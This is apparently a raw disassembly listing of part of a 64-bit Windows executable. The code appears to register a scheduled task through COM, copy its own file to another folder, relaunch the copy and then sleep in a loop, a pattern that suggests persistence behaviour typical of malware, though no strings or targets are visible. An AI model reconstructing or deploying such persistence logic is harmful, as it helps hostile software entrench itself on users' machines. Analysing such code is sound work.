   140001729:	4c 89 7b 08          	mov    %r15,0x8(%rbx)
   14000172d:	ba 18 00 00 00       	mov    $0x18,%edx
   140001732:	48 8b cb             	mov    %rbx,%rcx
   140001735:	e8 96 08 00 00       	call   0x140001fd0
   14000173a:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   14000173e:	48 8b 01             	mov    (%rcx),%rax
   140001741:	ff 50 10             	call   *0x10(%rax)
   140001744:	4c 89 bd 90 00 00 00 	mov    %r15,0x90(%rbp)
   14000174b:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   14000174f:	48 8b 01             	mov    (%rcx),%rax
   140001752:	48 8d 95 90 00 00 00 	lea    0x90(%rbp),%rdx
   140001759:	ff 50 48             	call   *0x48(%rax)
   14000175c:	85 c0                	test   %eax,%eax
   14000175e:	78 35                	js     0x140001795
   140001760:	4c 89 7d 50          	mov    %r15,0x50(%rbp)
   140001764:	48 8b 8d 90 00 00 00 	mov    0x90(%rbp),%rcx
   14000176b:	48 8b 01             	mov    (%rcx),%rax
   14000176e:	4c 8d 45 50          	lea    0x50(%rbp),%r8
   140001772:	ba 09 00 00 00       	mov    $0x9,%edx
   140001777:	ff 50 50             	call   *0x50(%rax)
   14000177a:	85 c0                	test   %eax,%eax
   14000177c:	78 0a                	js     0x140001788
   14000177e:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140001782:	48 8b 01             	mov    (%rcx),%rax
   140001785:	ff 50 10             	call   *0x10(%rax)
   140001788:	48 8b 8d 90 00 00 00 	mov    0x90(%rbp),%rcx
   14000178f:	48 8b 01             	mov    (%rcx),%rax
   140001792:	ff 50 10             	call   *0x10(%rax)
   140001795:	4c 89 bd 98 00 00 00 	mov    %r15,0x98(%rbp)
   14000179c:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   1400017a0:	48 8b 01             	mov    (%rcx),%rax
   1400017a3:	48 8d 95 98 00 00 00 	lea    0x98(%rbp),%rdx
   1400017aa:	ff 90 88 00 00 00    	call   *0x88(%rax)
   1400017b0:	85 c0                	test   %eax,%eax
   1400017b2:	0f 88 0b 01 00 00    	js     0x1400018c3
   1400017b8:	4c 89 7d 50          	mov    %r15,0x50(%rbp)
   1400017bc:	48 8b 8d 98 00 00 00 	mov    0x98(%rbp),%rcx
   1400017c3:	48 8b 01             	mov    (%rcx),%rax
   1400017c6:	4c 8d 45 50          	lea    0x50(%rbp),%r8
   1400017ca:	33 d2                	xor    %edx,%edx
   1400017cc:	ff 50 60             	call   *0x60(%rax)
   1400017cf:	85 c0                	test   %eax,%eax
   1400017d1:	0f 88 df 00 00 00    	js     0x1400018b6
   1400017d7:	4c 89 7d 70          	mov    %r15,0x70(%rbp)
   1400017db:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   1400017df:	48 8b 01             	mov    (%rcx),%rax
   1400017e2:	4c 8d 45 70          	lea    0x70(%rbp),%r8
   1400017e6:	48 8d 15 8b 2b 00 00 	lea    0x2b8b(%rip),%rdx        # 0x140004378
   1400017ed:	ff 10                	call   *(%rax)
   1400017ef:	85 c0                	test   %eax,%eax
   1400017f1:	0f 88 b5 00 00 00    	js     0x1400018ac
   1400017f7:	48 8b 45 70          	mov    0x70(%rbp),%rax
   1400017fb:	48 8b 08             	mov    (%rax),%rcx
   1400017fe:	48 8b 71 58          	mov    0x58(%rcx),%rsi
   140001802:	b9 18 00 00 00       	mov    $0x18,%ecx
   140001807:	e8 cc 07 00 00       	call   0x140001fd8
   14000180c:	48 8b d8             	mov    %rax,%rbx
   14000180f:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001814:	48 85 c0             	test   %rax,%rax
   140001817:	74 32                	je     0x14000184b
   140001819:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000181c:	33 c0                	xor    %eax,%eax
   14000181e:	0f 11 03             	movups %xmm0,(%rbx)
   140001821:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140001825:	4c 89 7b 08          	mov    %r15,0x8(%rbx)
   140001829:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   140001830:	48 8d 0d d1 2c 00 00 	lea    0x2cd1(%rip),%rcx        # 0x140004508
   140001837:	ff 15 9b 28 00 00    	call   *0x289b(%rip)        # 0x1400040d8
   14000183d:	48 89 03             	mov    %rax,(%rbx)
   140001840:	48 85 c0             	test   %rax,%rax
   140001843:	0f 84 1f 03 00 00    	je     0x140001b68
   140001849:	eb 03                	jmp    0x14000184e
   14000184b:	49 8b df             	mov    %r15,%rbx
   14000184e:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140001853:	48 85 db             	test   %rbx,%rbx
   140001856:	0f 84 2d 03 00 00    	je     0x140001b89
   14000185c:	48 8b 13             	mov    (%rbx),%rdx
   14000185f:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   140001863:	ff d6                	call   *%rsi
   140001865:	90                   	nop
   140001866:	8b c7                	mov    %edi,%eax
   140001868:	f0 0f c1 43 10       	lock xadd %eax,0x10(%rbx)
   14000186d:	83 f8 01             	cmp    $0x1,%eax
   140001870:	75 30                	jne    0x1400018a2
   140001872:	48 8b 0b             	mov    (%rbx),%rcx
   140001875:	48 85 c9             	test   %rcx,%rcx
   140001878:	74 09                	je     0x140001883
   14000187a:	ff 15 68 28 00 00    	call   *0x2868(%rip)        # 0x1400040e8
   140001880:	4c 89 3b             	mov    %r15,(%rbx)
   140001883:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140001887:	48 85 c9             	test   %rcx,%rcx
   14000188a:	74 09                	je     0x140001895
   14000188c:	e8 3f 07 00 00       	call   0x140001fd0
   140001891:	4c 89 7b 08          	mov    %r15,0x8(%rbx)
   140001895:	ba 18 00 00 00       	mov    $0x18,%edx
   14000189a:	48 8b cb             	mov    %rbx,%rcx
   14000189d:	e8 2e 07 00 00       	call   0x140001fd0
   1400018a2:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   1400018a6:	48 8b 01             	mov    (%rcx),%rax
   1400018a9:	ff 50 10             	call   *0x10(%rax)
   1400018ac:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   1400018b0:	48 8b 01             	mov    (%rcx),%rax
   1400018b3:	ff 50 10             	call   *0x10(%rax)
   1400018b6:	48 8b 8d 98 00 00 00 	mov    0x98(%rbp),%rcx
   1400018bd:	48 8b 01             	mov    (%rcx),%rax
   1400018c0:	ff 50 10             	call   *0x10(%rax)
   1400018c3:	4c 89 bd 88 00 00 00 	mov    %r15,0x88(%rbp)
   1400018ca:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   1400018ce:	48 8b 01             	mov    (%rcx),%rax
   1400018d1:	48 8d 95 88 00 00 00 	lea    0x88(%rbp),%rdx
   1400018d8:	ff 50 58             	call   *0x58(%rax)
   1400018db:	85 c0                	test   %eax,%eax
   1400018dd:	78 31                	js     0x140001910
   1400018df:	8b d7                	mov    %edi,%edx
   1400018e1:	48 8b 8d 88 00 00 00 	mov    0x88(%rbp),%rcx
   1400018e8:	48 8b 01             	mov    (%rcx),%rax
   1400018eb:	ff 90 b0 00 00 00    	call   *0xb0(%rax)
   1400018f1:	8b d7                	mov    %edi,%edx
   1400018f3:	48 8b 8d 88 00 00 00 	mov    0x88(%rbp),%rcx
   1400018fa:	48 8b 01             	mov    (%rcx),%rax
   1400018fd:	ff 90 30 01 00 00    	call   *0x130(%rax)
   140001903:	48 8b 8d 88 00 00 00 	mov    0x88(%rbp),%rcx
   14000190a:	48 8b 01             	mov    (%rcx),%rax
   14000190d:	ff 50 10             	call   *0x10(%rax)
   140001910:	4c 89 bd a0 00 00 00 	mov    %r15,0xa0(%rbp)
   140001917:	48 8b 45 78          	mov    0x78(%rbp),%rax
   14000191b:	48 8b 08             	mov    (%rax),%rcx
   14000191e:	4c 8b b1 88 00 00 00 	mov    0x88(%rcx),%r14
   140001925:	bb 08 00 00 00       	mov    $0x8,%ebx
   14000192a:	66 89 5d b8          	mov    %bx,-0x48(%rbp)
   14000192e:	48 8d 0d 13 2c 00 00 	lea    0x2c13(%rip),%rcx        # 0x140004548
   140001935:	ff 15 9d 27 00 00    	call   *0x279d(%rip)        # 0x1400040d8
   14000193b:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
   14000193f:	48 85 c0             	test   %rax,%rax
   140001942:	0f 84 4c 02 00 00    	je     0x140001b94
   140001948:	0f 10 45 b8          	movups -0x48(%rbp),%xmm0
   14000194c:	0f 11 44 24 60       	movups %xmm0,0x60(%rsp)
   140001951:	f2 0f 10 45 c8       	movsd  -0x38(%rbp),%xmm0
   140001956:	f2 0f 11 45 50       	movsd  %xmm0,0x50(%rbp)
   14000195b:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   14000195f:	ff 15 6b 27 00 00    	call   *0x276b(%rip)        # 0x1400040d0
   140001965:	90                   	nop
   140001966:	0f 10 45 d0          	movups -0x30(%rbp),%xmm0
   14000196a:	0f 11 45 10          	movups %xmm0,0x10(%rbp)
   14000196e:	f2 0f 10 45 e0       	movsd  -0x20(%rbp),%xmm0
   140001973:	f2 0f 11 45 70       	movsd  %xmm0,0x70(%rbp)
   140001978:	66 89 5d a0          	mov    %bx,-0x60(%rbp)
   14000197c:	48 8d 0d 75 2b 00 00 	lea    0x2b75(%rip),%rcx        # 0x1400044f8
   140001983:	ff 15 4f 27 00 00    	call   *0x274f(%rip)        # 0x1400040d8
   140001989:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
   14000198d:	48 85 c0             	test   %rax,%rax
   140001990:	0f 84 09 02 00 00    	je     0x140001b9f
   140001996:	0f 10 45 a0          	movups -0x60(%rbp),%xmm0
   14000199a:	0f 11 45 80          	movups %xmm0,-0x80(%rbp)
   14000199e:	f2 0f 10 45 b0       	movsd  -0x50(%rbp),%xmm0
   1400019a3:	f2 0f 11 44 24 50    	movsd  %xmm0,0x50(%rsp)
   1400019a9:	48 8b 75 68          	mov    0x68(%rbp),%rsi
   1400019ad:	b9 18 00 00 00       	mov    $0x18,%ecx
   1400019b2:	e8 21 06 00 00       	call   0x140001fd8
   1400019b7:	48 8b d8             	mov    %rax,%rbx
   1400019ba:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400019be:	48 85 c0             	test   %rax,%rax
   1400019c1:	74 32                	je     0x1400019f5
   1400019c3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400019c6:	33 c0                	xor    %eax,%eax
   1400019c8:	0f 11 03             	movups %xmm0,(%rbx)
   1400019cb:	48 89 43 10          	mov    %rax,0x10(%rbx)
   1400019cf:	4c 89 7b 08          	mov    %r15,0x8(%rbx)
   1400019d3:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   1400019da:	48 8d 0d 67 2a 00 00 	lea    0x2a67(%rip),%rcx        # 0x140004448
   1400019e1:	ff 15 f1 26 00 00    	call   *0x26f1(%rip)        # 0x1400040d8
   1400019e7:	48 89 03             	mov    %rax,(%rbx)
   1400019ea:	48 85 c0             	test   %rax,%rax
   1400019ed:	0f 84 80 01 00 00    	je     0x140001b73
   1400019f3:	eb 03                	jmp    0x1400019f8
   1400019f5:	49 8b df             	mov    %r15,%rbx
   1400019f8:	48 89 5d f0          	mov    %rbx,-0x10(%rbp)
   1400019fc:	48 85 db             	test   %rbx,%rbx
   1400019ff:	0f 84 16 01 00 00    	je     0x140001b1b
   140001a05:	0f 10 44 24 60       	movups 0x60(%rsp),%xmm0
   140001a0a:	0f 29 45 30          	movaps %xmm0,0x30(%rbp)
   140001a0e:	f2 0f 10 4d 50       	movsd  0x50(%rbp),%xmm1
   140001a13:	f2 0f 11 4d 40       	movsd  %xmm1,0x40(%rbp)
   140001a18:	0f 10 45 10          	movups 0x10(%rbp),%xmm0
   140001a1c:	0f 29 44 24 60       	movaps %xmm0,0x60(%rsp)
   140001a21:	f2 0f 10 4d 70       	movsd  0x70(%rbp),%xmm1
   140001a26:	f2 0f 11 4c 24 70    	movsd  %xmm1,0x70(%rsp)
   140001a2c:	0f 10 45 80          	movups -0x80(%rbp),%xmm0
   140001a30:	0f 29 45 80          	movaps %xmm0,-0x80(%rbp)
   140001a34:	f2 0f 10 4c 24 50    	movsd  0x50(%rsp),%xmm1
   140001a3a:	f2 0f 11 4d 90       	movsd  %xmm1,-0x70(%rbp)
   140001a3f:	48 8d 85 a0 00 00 00 	lea    0xa0(%rbp),%rax
   140001a46:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001a4b:	48 8d 45 30          	lea    0x30(%rbp),%rax
   140001a4f:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140001a54:	c7 44 24 30 05 00 00 	movl   $0x5,0x30(%rsp)
   140001a5b:	00 
   140001a5c:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   140001a61:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001a66:	48 8d 45 80          	lea    -0x80(%rbp),%rax
   140001a6a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001a6f:	41 b9 06 00 00 00    	mov    $0x6,%r9d
   140001a75:	4c 8b c6             	mov    %rsi,%r8
   140001a78:	48 8b 13             	mov    (%rbx),%rdx
   140001a7b:	48 8b 4d 78          	mov    0x78(%rbp),%rcx
   140001a7f:	41 ff d6             	call   *%r14
   140001a82:	8b f0                	mov    %eax,%esi
   140001a84:	f0 0f c1 7b 10       	lock xadd %edi,0x10(%rbx)
   140001a89:	83 ff 01             	cmp    $0x1,%edi
   140001a8c:	75 31                	jne    0x140001abf
   140001a8e:	48 8b 0b             	mov    (%rbx),%rcx
   140001a91:	48 85 c9             	test   %rcx,%rcx
   140001a94:	74 09                	je     0x140001a9f
   140001a96:	ff 15 4c 26 00 00    	call   *0x264c(%rip)        # 0x1400040e8
   140001a9c:	4c 89 3b             	mov    %r15,(%rbx)
   140001a9f:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140001aa3:	48 85 c9             	test   %rcx,%rcx
   140001aa6:	74 09                	je     0x140001ab1
   140001aa8:	e8 23 05 00 00       	call   0x140001fd0
   140001aad:	4c 89 7b 08          	mov    %r15,0x8(%rbx)
   140001ab1:	ba 18 00 00 00       	mov    $0x18,%edx
   140001ab6:	48 8b cb             	mov    %rbx,%rcx
   140001ab9:	e8 12 05 00 00       	call   0x140001fd0
   140001abe:	90                   	nop
   140001abf:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   140001ac3:	ff 15 17 26 00 00    	call   *0x2617(%rip)        # 0x1400040e0
   140001ac9:	90                   	nop
   140001aca:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140001ace:	ff 15 0c 26 00 00    	call   *0x260c(%rip)        # 0x1400040e0
   140001ad4:	90                   	nop
   140001ad5:	48 8d 4d b8          	lea    -0x48(%rbp),%rcx
   140001ad9:	ff 15 01 26 00 00    	call   *0x2601(%rip)        # 0x1400040e0
   140001adf:	85 f6                	test   %esi,%esi
   140001ae1:	78 0d                	js     0x140001af0
   140001ae3:	48 8b 8d a0 00 00 00 	mov    0xa0(%rbp),%rcx
   140001aea:	48 8b 01             	mov    (%rcx),%rax
   140001aed:	ff 50 10             	call   *0x10(%rax)
   140001af0:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   140001af4:	48 8b 01             	mov    (%rcx),%rax
   140001af7:	ff 50 10             	call   *0x10(%rax)
   140001afa:	48 8b 4d 78          	mov    0x78(%rbp),%rcx
   140001afe:	48 8b 01             	mov    (%rcx),%rax
   140001b01:	ff 50 10             	call   *0x10(%rax)
   140001b04:	48 8b 4d 58          	mov    0x58(%rbp),%rcx
   140001b08:	48 8b 01             	mov    (%rcx),%rax
   140001b0b:	ff 50 10             	call   *0x10(%rax)
   140001b0e:	ff 15 6c 27 00 00    	call   *0x276c(%rip)        # 0x140004280
   140001b14:	8b c6                	mov    %esi,%eax
   140001b16:	e9 39 f7 ff ff       	jmp    0x140001254
   140001b1b:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140001b20:	e8 eb 02 00 00       	call   0x140001e10
   140001b25:	90                   	nop
   140001b26:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140001b2b:	e8 e0 02 00 00       	call   0x140001e10
   140001b30:	90                   	nop
   140001b31:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140001b36:	e8 d5 02 00 00       	call   0x140001e10
   140001b3b:	90                   	nop
   140001b3c:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140001b41:	e8 ca 02 00 00       	call   0x140001e10
   140001b46:	90                   	nop
   140001b47:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140001b4c:	e8 bf 02 00 00       	call   0x140001e10
   140001b51:	90                   	nop
   140001b52:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140001b57:	e8 b4 02 00 00       	call   0x140001e10
   140001b5c:	90                   	nop
   140001b5d:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140001b62:	e8 a9 02 00 00       	call   0x140001e10
   140001b67:	90                   	nop
   140001b68:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140001b6d:	e8 9e 02 00 00       	call   0x140001e10
   140001b72:	90                   	nop
   140001b73:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140001b78:	e8 93 02 00 00       	call   0x140001e10
   140001b7d:	90                   	nop
   140001b7e:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140001b83:	e8 88 02 00 00       	call   0x140001e10
   140001b88:	cc                   	int3
   140001b89:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140001b8e:	e8 7d 02 00 00       	call   0x140001e10
   140001b93:	cc                   	int3
   140001b94:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140001b99:	e8 72 02 00 00       	call   0x140001e10
   140001b9e:	90                   	nop
   140001b9f:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140001ba4:	e8 67 02 00 00       	call   0x140001e10
   140001ba9:	cc                   	int3
   140001baa:	cc                   	int3
   140001bab:	cc                   	int3
   140001bac:	cc                   	int3
   140001bad:	cc                   	int3
   140001bae:	cc                   	int3
   140001baf:	cc                   	int3
   140001bb0:	40 55                	rex push %rbp
   140001bb2:	48 8d ac 24 e0 f1 ff 	lea    -0xe20(%rsp),%rbp
   140001bb9:	ff 
   140001bba:	48 81 ec 20 0f 00 00 	sub    $0xf20,%rsp
   140001bc1:	48 8b 05 78 44 00 00 	mov    0x4478(%rip),%rax        # 0x140006040
   140001bc8:	48 33 c4             	xor    %rsp,%rax
   140001bcb:	48 89 85 10 0e 00 00 	mov    %rax,0xe10(%rbp)
   140001bd2:	ba 04 01 00 00       	mov    $0x104,%edx
   140001bd7:	48 8d 8d d0 05 00 00 	lea    0x5d0(%rbp),%rcx
   140001bde:	ff 15 2c 24 00 00    	call   *0x242c(%rip)        # 0x140004010
   140001be4:	ff c8                	dec    %eax
   140001be6:	3d 03 01 00 00       	cmp    $0x103,%eax
   140001beb:	0f 87 85 01 00 00    	ja     0x140001d76
   140001bf1:	4c 8d 85 d0 05 00 00 	lea    0x5d0(%rbp),%r8
   140001bf8:	ba 04 01 00 00       	mov    $0x104,%edx
   140001bfd:	48 8d 8d b0 01 00 00 	lea    0x1b0(%rbp),%rcx
   140001c04:	ff 15 66 26 00 00    	call   *0x2666(%rip)        # 0x140004270
   140001c0a:	48 8d 15 3f 29 00 00 	lea    0x293f(%rip),%rdx        # 0x140004550
   140001c11:	48 8d 8d b0 01 00 00 	lea    0x1b0(%rbp),%rcx
   140001c18:	ff 15 ea 24 00 00    	call   *0x24ea(%rip)        # 0x140004108
   140001c1e:	4c 8d 85 d0 05 00 00 	lea    0x5d0(%rbp),%r8
   140001c25:	ba 04 01 00 00       	mov    $0x104,%edx
   140001c2a:	48 8d 8d c0 03 00 00 	lea    0x3c0(%rbp),%rcx
   140001c31:	ff 15 39 26 00 00    	call   *0x2639(%rip)        # 0x140004270
   140001c37:	48 8d 15 2a 29 00 00 	lea    0x292a(%rip),%rdx        # 0x140004568
   140001c3e:	48 8d 8d c0 03 00 00 	lea    0x3c0(%rbp),%rcx
   140001c45:	ff 15 bd 24 00 00    	call   *0x24bd(%rip)        # 0x140004108
   140001c4b:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140001c51:	48 8d 95 e0 07 00 00 	lea    0x7e0(%rbp),%rdx
   140001c58:	33 c9                	xor    %ecx,%ecx
   140001c5a:	ff 15 a0 23 00 00    	call   *0x23a0(%rip)        # 0x140004000
   140001c60:	48 8d 95 b0 01 00 00 	lea    0x1b0(%rbp),%rdx
   140001c67:	48 8d 8d e0 07 00 00 	lea    0x7e0(%rbp),%rcx
   140001c6e:	ff 15 f4 25 00 00    	call   *0x25f4(%rip)        # 0x140004268
   140001c74:	85 c0                	test   %eax,%eax
   140001c76:	0f 84 fa 00 00 00    	je     0x140001d76
   140001c7c:	45 33 c0             	xor    %r8d,%r8d
   140001c7f:	48 8d 95 b0 01 00 00 	lea    0x1b0(%rbp),%rdx
   140001c86:	48 8d 8d e0 07 00 00 	lea    0x7e0(%rbp),%rcx
   140001c8d:	ff 15 a5 23 00 00    	call   *0x23a5(%rip)        # 0x140004038
   140001c93:	48 8d 8d c0 03 00 00 	lea    0x3c0(%rbp),%rcx
   140001c9a:	ff 15 70 24 00 00    	call   *0x2470(%rip)        # 0x140004110
   140001ca0:	85 c0                	test   %eax,%eax
   140001ca2:	75 61                	jne    0x140001d05
   140001ca4:	48 8d 55 a0          	lea    -0x60(%rbp),%rdx
   140001ca8:	b9 04 01 00 00       	mov    $0x104,%ecx
   140001cad:	ff 15 55 23 00 00    	call   *0x2355(%rip)        # 0x140004008
   140001cb3:	48 8d 15 ae 28 00 00 	lea    0x28ae(%rip),%rdx        # 0x140004568
   140001cba:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   140001cbe:	ff 15 44 24 00 00    	call   *0x2444(%rip)        # 0x140004108
   140001cc4:	45 33 c9             	xor    %r9d,%r9d
   140001cc7:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001cce:	00 00 
   140001cd0:	4c 8d 45 a0          	lea    -0x60(%rbp),%r8
   140001cd4:	33 c9                	xor    %ecx,%ecx
   140001cd6:	48 8d 15 a3 28 00 00 	lea    0x28a3(%rip),%rdx        # 0x140004580
   140001cdd:	ff 15 c5 25 00 00    	call   *0x25c5(%rip)        # 0x1400042a8
   140001ce3:	85 c0                	test   %eax,%eax
   140001ce5:	78 1e                	js     0x140001d05
   140001ce7:	45 33 c0             	xor    %r8d,%r8d
   140001cea:	48 8d 95 c0 03 00 00 	lea    0x3c0(%rbp),%rdx
   140001cf1:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   140001cf5:	ff 15 3d 23 00 00    	call   *0x233d(%rip)        # 0x140004038
   140001cfb:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   140001cff:	ff 15 1b 23 00 00    	call   *0x231b(%rip)        # 0x140004020
   140001d05:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001d08:	c7 44 24 30 70 00 00 	movl   $0x70,0x30(%rsp)
   140001d0f:	00 
   140001d10:	33 c0                	xor    %eax,%eax
   140001d12:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001d17:	48 89 45 94          	mov    %rax,-0x6c(%rbp)
   140001d1b:	89 45 9c             	mov    %eax,-0x64(%rbp)
   140001d1e:	48 8d 05 b3 28 00 00 	lea    0x28b3(%rip),%rax        # 0x1400045d8
   140001d25:	0f 11 44 24 34       	movups %xmm0,0x34(%rsp)
   140001d2a:	c7 44 24 34 40 00 00 	movl   $0x40,0x34(%rsp)
   140001d31:	00 
   140001d32:	0f 11 44 24 44       	movups %xmm0,0x44(%rsp)
   140001d37:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001d3c:	48 8d 85 b0 01 00 00 	lea    0x1b0(%rbp),%rax
   140001d43:	0f 11 44 24 54       	movups %xmm0,0x54(%rsp)
   140001d48:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140001d4d:	0f 11 44 24 64       	movups %xmm0,0x64(%rsp)
   140001d52:	c7 44 24 60 00 00 00 	movl   $0x0,0x60(%rsp)
   140001d59:	00 
   140001d5a:	0f 11 44 24 74       	movups %xmm0,0x74(%rsp)
   140001d5f:	0f 11 45 84          	movups %xmm0,-0x7c(%rbp)
   140001d63:	ff 15 8f 23 00 00    	call   *0x238f(%rip)        # 0x1400040f8
   140001d69:	85 c0                	test   %eax,%eax
   140001d6b:	74 09                	je     0x140001d76
   140001d6d:	33 c9                	xor    %ecx,%ecx
   140001d6f:	ff 15 bb 22 00 00    	call   *0x22bb(%rip)        # 0x140004030
   140001d75:	cc                   	int3
   140001d76:	ba 04 01 00 00       	mov    $0x104,%edx
   140001d7b:	48 8d 8d 00 0c 00 00 	lea    0xc00(%rbp),%rcx
   140001d82:	ff 15 88 22 00 00    	call   *0x2288(%rip)        # 0x140004010
   140001d88:	48 8d 15 c1 27 00 00 	lea    0x27c1(%rip),%rdx        # 0x140004550
   140001d8f:	48 8d 8d 00 0c 00 00 	lea    0xc00(%rbp),%rcx
   140001d96:	ff 15 6c 23 00 00    	call   *0x236c(%rip)        # 0x140004108
   140001d9c:	e8 df f2 ff ff       	call   0x140001080
   140001da1:	ba 04 01 00 00       	mov    $0x104,%edx
   140001da6:	48 8d 8d f0 09 00 00 	lea    0x9f0(%rbp),%rcx
   140001dad:	ff 15 5d 22 00 00    	call   *0x225d(%rip)        # 0x140004010
   140001db3:	48 8d 15 ae 27 00 00 	lea    0x27ae(%rip),%rdx        # 0x140004568
   140001dba:	48 8d 8d f0 09 00 00 	lea    0x9f0(%rbp),%rcx
   140001dc1:	ff 15 41 23 00 00    	call   *0x2341(%rip)        # 0x140004108
   140001dc7:	48 8d 8d f0 09 00 00 	lea    0x9f0(%rbp),%rcx
   140001dce:	ff 15 54 22 00 00    	call   *0x2254(%rip)        # 0x140004028
   140001dd4:	48 85 c0             	test   %rax,%rax
   140001dd7:	75 27                	jne    0x140001e00
   140001dd9:	b8 01 00 00 00       	mov    $0x1,%eax
   140001dde:	48 8b 8d 10 0e 00 00 	mov    0xe10(%rbp),%rcx
   140001de5:	48 33 cc             	xor    %rsp,%rcx
   140001de8:	e8 c3 01 00 00       	call   0x140001fb0
   140001ded:	48 81 c4 20 0f 00 00 	add    $0xf20,%rsp
   140001df4:	5d                   	pop    %rbp
   140001df5:	c3                   	ret
   140001df6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140001dfd:	00 00 00 
   140001e00:	b9 60 ea 00 00       	mov    $0xea60,%ecx
   140001e05:	ff 15 0d 22 00 00    	call   *0x220d(%rip)        # 0x140004018
   140001e0b:	eb f3                	jmp    0x140001e00
   140001e0d:	cc                   	int3
   140001e0e:	cc                   	int3
   140001e0f:	cc                   	int3
   140001e10:	48 8b 05 e9 41 00 00 	mov    0x41e9(%rip),%rax        # 0x140006000
   140001e17:	33 d2                	xor    %edx,%edx
   140001e19:	48 ff 25 a8 24 00 00 	rex.W jmp *0x24a8(%rip)        # 0x1400042c8
   140001e20:	40 53                	rex push %rbx
   140001e22:	48 83 ec 20          	sub    $0x20,%rsp
   140001e26:	48 8b d9             	mov    %rcx,%rbx
   140001e29:	48 8d 05 20 25 00 00 	lea    0x2520(%rip),%rax        # 0x140004350
   140001e30:	48 89 01             	mov    %rax,(%rcx)
   140001e33:	8b 42 08             	mov    0x8(%rdx),%eax
   140001e36:	89 41 08             	mov    %eax,0x8(%rcx)
   140001e39:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   140001e3d:	48 89 4b 10          	mov    %rcx,0x10(%rbx)
   140001e41:	48 c7 43 18 00 00 00 	movq   $0x0,0x18(%rbx)
   140001e48:	00 
   140001e49:	48 85 c9             	test   %rcx,%rcx
   140001e4c:	74 0d                	je     0x140001e5b
   140001e4e:	48 8b 01             	mov    (%rcx),%rax
   140001e51:	48 8b 40 08          	mov    0x8(%rax),%rax
   140001e55:	ff 15 6d 24 00 00    	call   *0x246d(%rip)        # 0x1400042c8
   140001e5b:	48 8b c3             	mov    %rbx,%rax
   140001e5e:	48 83 c4 20          	add    $0x20,%rsp
   140001e62:	5b                   	pop    %rbx
   140001e63:	c3                   	ret
   140001e64:	cc                   	int3
   140001e65:	cc                   	int3
   140001e66:	cc                   	int3
   140001e67:	cc                   	int3
   140001e68:	cc                   	int3
   140001e69:	cc                   	int3
   140001e6a:	cc                   	int3
   140001e6b:	cc                   	int3
   140001e6c:	cc                   	int3
   140001e6d:	cc                   	int3
   140001e6e:	cc                   	int3
   140001e6f:	cc                   	int3
   140001e70:	40 53                	rex push %rbx
   140001e72:	48 83 ec 20          	sub    $0x20,%rsp
   140001e76:	48 8b d9             	mov    %rcx,%rbx
   140001e79:	48 8d 05 d0 24 00 00 	lea    0x24d0(%rip),%rax        # 0x140004350
   140001e80:	48 89 01             	mov    %rax,(%rcx)
   140001e83:	89 51 08             	mov    %edx,0x8(%rcx)
   140001e86:	4c 89 41 10          	mov    %r8,0x10(%rcx)
   140001e8a:	48 c7 41 18 00 00 00 	movq   $0x0,0x18(%rcx)
   140001e91:	00 
   140001e92:	4d 85 c0             	test   %r8,%r8
   140001e95:	74 15                	je     0x140001eac
   140001e97:	45 84 c9             	test   %r9b,%r9b
   140001e9a:	74 10                	je     0x140001eac
   140001e9c:	49 8b 00             	mov    (%r8),%rax
   140001e9f:	49 8b c8             	mov    %r8,%rcx
   140001ea2:	48 8b 40 08          	mov    0x8(%rax),%rax
   140001ea6:	ff 15 1c 24 00 00    	call   *0x241c(%rip)        # 0x1400042c8
   140001eac:	48 8b c3             	mov    %rbx,%rax
   140001eaf:	48 83 c4 20          	add    $0x20,%rsp
